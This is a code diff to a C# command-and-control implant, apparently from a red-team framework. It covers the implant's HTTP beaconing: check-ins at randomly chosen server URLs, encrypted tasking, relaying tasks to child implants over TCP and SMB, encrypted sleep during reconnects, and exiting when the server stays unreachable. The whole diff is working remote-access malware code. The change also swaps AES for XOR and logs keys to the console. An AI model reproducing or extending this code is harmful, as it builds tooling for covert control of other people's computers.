@@ -67,94 +67,32 @@ namespace Engineer.Models
             {
                 //pick one of the strings in the Urls list and use it for the request
                 string url = Urls[new Random().Next(Urls.Count)];
-                //Console.WriteLine("Checking in with " + _client.BaseAddress + url);
-                var taskReturned = _client.GetAsync(url, HttpCompletionOption.ResponseContentRead); // gets anything waiting at the maanger for us to read, when this happens it triggers the HandleImplant in our TS 
-
-                if (await Task.WhenAny(taskReturned, Task.Delay(Sleep + 10000)) != taskReturned || taskReturned.Status == TaskStatus.Faulted)
+                #if DEBUG
+                Console.WriteLine("Checking in with " + _client.BaseAddress + url);
+                #endif
+                // gets anything waiting at the manager for us to read, when this happens it triggers the HandleImplant in our TS
+                HttpResponseMessage response = null;
+                try
                 {
-                    for (int i = 0; i < ConnectionAttempts; i++)
-                    {
-                        //Console.WriteLine("Attempting to reconnect");
-                        if (Program.Sleeptype == SleepTypes.Custom_RC4)
-                        {
-                            //make sure the SleepEncrypt class is loaded, we can use the custom Module attribute
-                            if (Program.typesWithModuleAttribute.Where(attr => attr.Name.Equals("SleepEncrypt", StringComparison.OrdinalIgnoreCase)).Count() > 0)
-                            {
-                                //Functions.SleepEncrypt.ExecuteSleep(EngCommBase.Sleep); //if we did not recvData and we have no data to send sleep for a bit
-                                var sleepEncryptModule = Program.typesWithModuleAttribute.ToList().Find(x => x.Name.Equals("SleepEncrypt", StringComparison.OrdinalIgnoreCase));
-                                // Get the method
-                                var method = sleepEncryptModule.GetMethod("ExecuteSleep", BindingFlags.Public | BindingFlags.Static);
-                                if (method != null)
-                                {
-                                    // Call the method , first argument is null because it's a static method
-                                    method.Invoke(null, new object[] { EngCommBase.Sleep });
-                                }
-                            }
-                            else
-                            {
-                                Thread.Sleep(EngCommBase.Sleep);
-                            }
-                        }
-                        else if (Program.Sleeptype == SleepTypes.None)
-                        {
-                            Thread.Sleep(EngCommBase.Sleep);
-                        }
-                        taskReturned = _client.GetAsync(url, HttpCompletionOption.ResponseContentRead);
-                        if (await Task.WhenAny(taskReturned, Task.Delay(Sleep + 10000)) == taskReturned && taskReturned.Status != TaskStatus.Faulted)
-                        {
-                            break;
-                        }
-                        if (i == ConnectionAttempts)
-                        {
-                            Environment.Exit(0);
-                        }
-                    }
+                    response = await _client.GetAsync(url);
                 }
-                var HttpResponseMessageReturned = await taskReturned;
-                var EncryptedresponseByte = HttpResponseMessageReturned.Content.ReadAsByteArrayAsync().Result;
-                if (EncryptedresponseByte.Count() > 0 && HttpResponseMessageReturned.StatusCode != HttpStatusCode.NoContent) //if response is NOT null, empty, or white space then decrypt and handle it
+                catch (Exception e)
                 {
-                    //Console.WriteLine($"Got response from manager, trying to decrypt with key {Program.MessagePathKey}");
-                    var DecryptedTaskMessage = Encryption.AES_Decrypt(EncryptedresponseByte, Program.MessagePathKey);
-                    var C2MessageList = DecryptedTaskMessage.JsonDeserialize<List<C2TaskMessage>>();
-                    //Console.WriteLine("C2TaskMessage deserialized");
-                    foreach (C2TaskMessage taskMessage in C2MessageList)
+                    if (e is HttpRequestException)
                     {
-                        if (taskMessage.PathMessage.Count() == 1)
-                        {
-                            //Console.WriteLine($"Using {Program.UniqueTaskKey} to decrypt task");
-                            var decTask = Encryption.AES_Decrypt(taskMessage.TaskData.ToArray(), "", Program.UniqueTaskKey);
-                            //Console.WriteLine($"Task decrypted");
-                            HandleResponse(decTask);
-                        }
-                        else
-                        {
-                            //read the path and see if it is a child engineer and forward it on.
-                            taskMessage.PathMessage.RemoveAt(0);
-                            string dest = taskMessage.PathMessage[0];
-                           // Console.WriteLine($"{DateTime.UtcNow} got task for child {dest}");
-                            var serializedTaskMessage = taskMessage.JsonSerialize();
-                            var EncryptedTaskMessage = Encryption.AES_Encrypt(serializedTaskMessage, Program.MessagePathKey);
-
-                            //find the dest key in the EngTCPComm.ParentToChildData or EngSMBComm.ParentToChildData and add the task to the queue
-                            if (EngTCPComm.ParentToChildData.ContainsKey(dest))
-                            {
-                                EngTCPComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
-                            }
-                            else if(EngSMBComm.ParentToChildData.ContainsKey(dest))
-                            {
-                                EngSMBComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
-                            }
-                           
-                        }
+                        response = await HandleConnectionFailure(url, "get");
                     }
-
+                    Console.WriteLine(e);
+                }
+                if (response.StatusCode != HttpStatusCode.NoContent)
+                {
+                    var EncresponseContent = await response.Content.ReadAsByteArrayAsync();
+                    await HandleResponse(EncresponseContent);
                 }
             }
             catch (Exception ex)
             {
                 Console.WriteLine(ex.Message);
-                Console.WriteLine(ex.StackTrace);
             }
         }
 
@@ -164,62 +102,32 @@ namespace Engineer.Models
             {
                 string url = Urls[new Random().Next(Urls.Count)];
                 var outbound = GetOutbound().JsonSerialize(); // serialize the list into a byte array
-                // encrypt the byte array
-                var Encryptedoutbound = Encryption.AES_Encrypt(outbound, "", Program.UniqueTaskKey);
-                // encrypt the implant id
-                byte[] Implant_id_bytes = Encoding.UTF8.GetBytes(engineerMetadata.Id);
-                // get the length of the implant id
-                byte[] implant_id_length = BitConverter.GetBytes(Implant_id_bytes.Length);
-                //concat the encrypted byte array with the encrypted implant id                                                                           
-                var EncryptedoutboundWithId = Implant_id_bytes.Concat(Encryptedoutbound).ToArray();
-                var final_Encrypted_outbound = implant_id_length.Concat(EncryptedoutboundWithId).ToArray();
-                //turn the encrypted byte array into HttpContent
-                var EncryptedoutboundContent = new ByteArrayContent(final_Encrypted_outbound);
-                //Console.WriteLine($"{DateTime.UtcNow} posting http Task Response");
-                var response = await _client.PostAsync(url, EncryptedoutboundContent);
+                // encrypt the byte array with final message key
+                byte[] bytesToSend = Encryption.Xor(outbound, Program.MessagePathKey);
+                var EncryptedoutboundContent = new ByteArrayContent(bytesToSend);
+                HttpResponseMessage response = null;
+                try
+                {
+                    response = await _client.PostAsync(url, EncryptedoutboundContent);
+                }
+                catch (Exception e)
+                {
+                    if(e is HttpRequestException)
+                    {
+                        response = await HandleConnectionFailure(url, "post", bytesToSend);
+                    }
+                    Console.WriteLine(e);
+                    
+                }
                 if (response.StatusCode != HttpStatusCode.NoContent)
                 {
                     var EncresponseContent = await response.Content.ReadAsByteArrayAsync();
-                    //if response is NOT null, empty, or white space then decrypt and handle it
-                    if (EncresponseContent.Length > 0)
-                    {
-                        //Console.WriteLine("Response from Post: " + EncresponseContent.Length + "bytes");
-                        var decMessage = Encryption.AES_Decrypt(EncresponseContent, Program.MessagePathKey);
-                        var C2MessageList = decMessage.JsonDeserialize<List<C2TaskMessage>>();
-                        //Console.WriteLine("C2TaskMessage deserialized");
-                        foreach (C2TaskMessage taskMessage in C2MessageList)
-                        {
-                            if (taskMessage.PathMessage.Count() == 1)
-                            {
-                                var decTask = Encryption.AES_Decrypt(taskMessage.TaskData.ToArray(), "", Program.UniqueTaskKey);
-                                HandleResponse(decTask);
-                            }
-                            else
-                            {
-                                //read the path and see if it is a child engineer and forward it on.
-                                taskMessage.PathMessage.RemoveAt(0);
-                                string dest = taskMessage.PathMessage[0];
-                                //Console.WriteLine($"{DateTime.Now} got task for child {dest}");
-                                var serializedTaskMessage = taskMessage.JsonSerialize();
-                                var EncryptedTaskMessage = Encryption.AES_Encrypt(serializedTaskMessage, Program.MessagePathKey);
-                                //find the dest key in the EngTCPComm.ParentToChildData or EngSMBComm.ParentToChildData and add the task to the queue
-                                if (EngTCPComm.ParentToChildData.ContainsKey(dest))
-                                {
-                                    EngTCPComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
-                                }
-                                else if (EngSMBComm.ParentToChildData.ContainsKey(dest))
-                                {
-                                    EngSMBComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
-                                }
-                            }
-
-                        }
-                    }
+                    await HandleResponse(EncresponseContent);
                 }
             }
             catch (Exception e)
             {
-                //Console.WriteLine(e.Message);
+                Console.WriteLine(e.Message);
             }
         }
 
@@ -229,73 +137,179 @@ namespace Engineer.Models
             try
             {
                 string url = Urls[new Random().Next(Urls.Count)];
-                List<byte[]> Encryptedoutbound = GetP2POutbound(); //already has the encryption and seralization 
+                //already has the encryption and seralization 
+                List<byte[]> Encryptedoutbound = GetP2POutbound();
                 //turn the encrypted byte array into HttpContent
                 //join all the items in the list into one byte array
-                var EncryptedoutboundContent = new ByteArrayContent(Encryptedoutbound.SelectMany(x => x).ToArray());
-                //var EncryptedoutboundContent = new ByteArrayContent(Encryptedoutbound);
-
-                var response = await _client.PostAsync(url, EncryptedoutboundContent);
-                //Console.WriteLine($"{DateTime.UtcNow} posting P2P Task Response, size {EncryptedoutboundContent.Headers.ContentLength} bytes");
-                var EncresponseContent = await response.Content.ReadAsByteArrayAsync();
-                if (EncresponseContent.Length > 0) //if response is NOT null, empty, or white space then decrypt and handle it
+                byte[] bytesToSend = Encryptedoutbound.Aggregate((x, y) => x.Concat(y).ToArray());
+                var EncryptedoutboundContent = new ByteArrayContent(bytesToSend);
+                HttpResponseMessage response = null;
+                try
                 {
-                    //Console.WriteLine("Response from Post: " + EncresponseContent.Length + "bytes");
-                    var decMessage = Encryption.AES_Decrypt(EncresponseContent, Program.MessagePathKey);
-                    var C2MessageList = decMessage.JsonDeserialize<List<C2TaskMessage>>();
-                    //Console.WriteLine("C2TaskMessage deserialized");
-                    foreach (C2TaskMessage taskMessage in C2MessageList)
+                    response = await _client.PostAsync(url, EncryptedoutboundContent);
+                }
+                catch (Exception e)
+                {
+                    if (e is HttpRequestException)
                     {
-                        //if pathing count is 1 then it is for this engineer
-                        if (taskMessage.PathMessage.Count() == 1)
-                        {
-                            var decTask = Encryption.AES_Decrypt(taskMessage.TaskData.ToArray(), "", Program.UniqueTaskKey);
-                            HandleResponse(decTask);
-                        }
-                        // if pathing is higher then 1 then it is for a child engineer
-                        else
-                        {
-                            //read the path and see if it is a child engineer and forward it on.
-                            taskMessage.PathMessage.RemoveAt(0);
-                            string dest = taskMessage.PathMessage[0];
-                            //Console.WriteLine($"{DateTime.UtcNow} got task for child {dest}");
-                            var serializedTaskMessage = taskMessage.JsonSerialize();
-                            var EncryptedTaskMessage = Encryption.AES_Encrypt(serializedTaskMessage, Program.MessagePathKey);
-                            //find the dest key in the EngTCPComm.ParentToChildData or EngSMBComm.ParentToChildData and add the task to the queue
-                            if (EngTCPComm.ParentToChildData.ContainsKey(dest))
-                            {
-                                EngTCPComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
-                            }
-                            else if(EngSMBComm.ParentToChildData.ContainsKey(dest))
-                            {
-                                EngSMBComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
-                            }
-                        }
+                        response = await HandleConnectionFailure(url, "post", bytesToSend);
+                    }
+                    Console.WriteLine(e);
+                }
+                if (response.StatusCode != HttpStatusCode.NoContent)
+                {
+                    var EncresponseContent = await response.Content.ReadAsByteArrayAsync();
+                    await HandleResponse(EncresponseContent);
+                }
+            }
+            catch (Exception e)
+            {
+                #if DEBUG
+                Console.WriteLine(e.Message);
+                #endif
+            }
+        }
 
+        private async Task<HttpResponseMessage> HandleConnectionFailure(string url,string connectionMethod, byte[] dataToSend = null)
+        {
+            for (int i = 0; i < ConnectionAttempts; i++)
+            {
+                #if DEBUG
+                Console.WriteLine("Attempting to reconnect");
+                #endif
+                //sleep for a bit before trying to reconnect
+                if (Program.Sleeptype == SleepTypes.Custom_RC4)
+                {
+                    //make sure the SleepEncrypt class is loaded, we can use the custom Module attribute
+                    if (Program.typesWithModuleAttribute.Any(attr => attr.Name.Equals("SleepEncrypt", StringComparison.OrdinalIgnoreCase)))
+                    {
+                        //if we did not recvData and we have no data to send sleep for a bit
+                        var sleepEncryptModule = Program.typesWithModuleAttribute.ToList().Find(x => x.Name.Equals("SleepEncrypt", StringComparison.OrdinalIgnoreCase));
+                        // Get the method
+                        var method = sleepEncryptModule.GetMethod("ExecuteSleep", BindingFlags.Public | BindingFlags.Static);
+                        // Call the method , first argument is null because it's a static method
+                        method?.Invoke(null, new object[] { EngCommBase.Sleep });
+                    }
+                    else
+                    {
+                        Thread.Sleep(EngCommBase.Sleep);
+                    }
+                }
+                else if (Program.Sleeptype == SleepTypes.None)
+                {
+                    Thread.Sleep(EngCommBase.Sleep);
+                }
+                //retry the connection
+                HttpResponseMessage httpResponseMessage = null;
+                if (connectionMethod.Equals("get", StringComparison.CurrentCultureIgnoreCase))
+                {
+                    httpResponseMessage = await _client.GetAsync(url, HttpCompletionOption.ResponseContentRead);
+                }
+                else if(connectionMethod.Equals("post", StringComparison.CurrentCultureIgnoreCase))
+                {
+                    var EncryptedoutboundContent = new ByteArrayContent(dataToSend);
+                    httpResponseMessage = await _client.PostAsync(url, EncryptedoutboundContent);
+                }
+                //if the message is a success then return true and the response
+                if (httpResponseMessage.IsSuccessStatusCode)
+                {
+                    return httpResponseMessage;
+                }
+                //if we have tried all of the connection attempts and still have not connected then exit
+                if (i >= ConnectionAttempts)
+                {
+                    Environment.Exit(0);
+                }
+            }
+            //we should never get here but if we do return null
+            return null;
+        }
+
+        private async Task HandleResponse(byte[] EncryptedresponseBytes)
+        {
+            if(EncryptedresponseBytes == null || EncryptedresponseBytes.Length < 1)
+            {
+                return;
+            }
+            try
+            {
+                Console.WriteLine($"Got response from manager, trying to decrypt with key {Program.MessagePathKey}");
+                var DecryptedTaskMessage = Encryption.Xor(EncryptedresponseBytes, Program.MessagePathKey);
+                var C2MessageList = DecryptedTaskMessage.JsonDeserialize<List<C2Message>>();
+                #if DEBUG
+                Console.WriteLine("C2Message deserialized");
+                #endif
+                foreach (C2Message _c2message in C2MessageList)
+                {
+                    if (_c2message.PathMessage.Count() == 1 && _c2message.Data != null)
+                    {
+                        Console.WriteLine($"Using {Program.UniqueTaskKey} to decrypt task");
+                        var decryptedMessageContent = Encryption.AES_Decrypt(_c2message.Data, "", Program.UniqueTaskKey);
+                        #if DEBUG
+                        Console.WriteLine($"Task decrypted");
+                        #endif
+                        if (_c2message.MessageType is 1 && decryptedMessageContent != null)
+                        {
+                            HandleTaskingResponse(decryptedMessageContent);
+                        }
+                        else if (_c2message.MessageType is 2 && decryptedMessageContent != null)
+                        {
+                            await ProcessInboundNotif(decryptedMessageContent);
+                        }
+                    }
+                    else
+                    {
+                        //read the path and see if it is a child engineer and forward it on.
+                        _c2message.PathMessage.RemoveAt(0);
+                        string dest = _c2message.PathMessage[0];
+                        // Console.WriteLine($"{DateTime.UtcNow} got task for child {dest}");
+                        var serializedTaskMessage = _c2message.JsonSerialize();
+                        var EncryptedTaskMessage = Encryption.Xor(serializedTaskMessage, Program.MessagePathKey);
+
+                        //find the dest key in the EngTCPComm.ParentToChildData or EngSMBComm.ParentToChildData and add the task to the queue
+                        if (EngTCPComm.ParentToChildData.ContainsKey(dest))
+                        {
+                            EngTCPComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
+                        }
+                        else if (EngSMBComm.ParentToChildData.ContainsKey(dest))
+                        {
+                            EngSMBComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
+                        }
                     }
                 }
             }
             catch (Exception e)
             {
-               //Console.WriteLine(e.Message);
+                Console.WriteLine(e);
             }
-
         }
 
-        private bool HandleResponse(byte[] response) //if not null we have stuff to do 
-        {
 
+        private bool HandleTaskingResponse(byte[] response) //if not null we have stuff to do 
+        {
             var tasks = response.JsonDeserialize<List<EngineerTask>>();
 
             if (tasks != null && tasks.Any())
             {
                 foreach (var task in tasks)
                 {
-                    Inbound.Enqueue(task);
+                    InboundTasks.Enqueue(task);
                 }
                 return true;
             }
             return false;
+        }
+
+        private async Task ProcessInboundNotif(byte[] response)
+        {
+            var notifs = response.JsonDeserialize<List<AssetNotification>>();
+            if (notifs != null && notifs.Any())
+            {
+                foreach (var notif in notifs)
+                {
+                    InboundNotifs.Enqueue(notif);
+                }
+            }
         }
 
         public override async Task Start()
